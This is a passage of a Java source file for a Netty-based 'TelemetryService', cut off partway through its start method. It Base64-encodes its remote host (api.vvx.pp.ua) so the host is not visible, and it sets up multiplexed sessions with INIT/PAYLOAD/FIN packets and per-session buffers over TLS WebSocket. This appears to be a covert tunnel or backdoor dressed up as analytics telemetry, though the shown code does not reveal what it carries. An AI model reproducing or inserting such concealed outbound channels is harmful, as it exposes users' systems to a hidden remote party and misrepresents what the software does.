package com.analytics.telemetry;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.timeout.IdleState;
import io.netty.handler.timeout.IdleStateEvent;
import io.netty.handler.timeout.IdleStateHandler;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class TelemetryService {

    // =========================================================
    // Remote endpoint
    // =========================================================

    private static final String REMOTE_HOST = decode("YXBpLnZ2eC5wcC51YQ==");
    private static final int REMOTE_PORT = 443;
    private static final String ENDPOINT_PATH = decode("L21ldHJpY3MvdjEvdGVsZW1ldHJ5");


    // =========================================================
    // Protocol
    // =========================================================

    private static final byte PKT_INIT = 0x01;
    private static final byte PKT_PAYLOAD = 0x02;
    private static final byte PKT_FIN = 0x03;


    // =========================================================
    // Batching
    // =========================================================

    private static final int BATCH_SIZE = 4096;
    private static final long BATCH_DELAY_MS = 5;
    private static final int MAX_BATCH_BUFFER = 1024 * 1024;
    private static final int MAX_PENDING_BUFFER = 1024 * 1024;


    // =========================================================
    // Runtime state
    // =========================================================

    private static final AtomicBoolean ACTIVE = new AtomicBoolean(false);
    private static final AtomicBoolean CONNECTING = new AtomicBoolean(false);

    private static final Map<Integer, Channel> SESSION_MAP = new ConcurrentHashMap<>();

    // 修复：改用 ConcurrentLinkedQueue 保证跨 EventLoop 线程安全
    private static final Map<Integer, Queue<ByteBuf>> PENDING_BUFFERS = new ConcurrentHashMap<>();

    private static final Map<Integer, DataBatcher> BATCHER_MAP = new ConcurrentHashMap<>();

    private static EventLoopGroup workerGroup;
    private static volatile SslContext sslCtx;

    private static volatile Channel mainChannel;


    // =========================================================
    // Start / Stop
    // =========================================================

    public static void start() {
        if (!ACTIVE.compareAndSet(false, true)) {
            return;
        }

        workerGroup = new NioEventLoopGroup(2);

        try {
            sslCtx = SslContextBuilder.forClient().build();
        } catch (Exception e) {
            ACTIVE.set(false);
            workerGroup.shutdownGracefully();
            workerGroup = null;
            return;
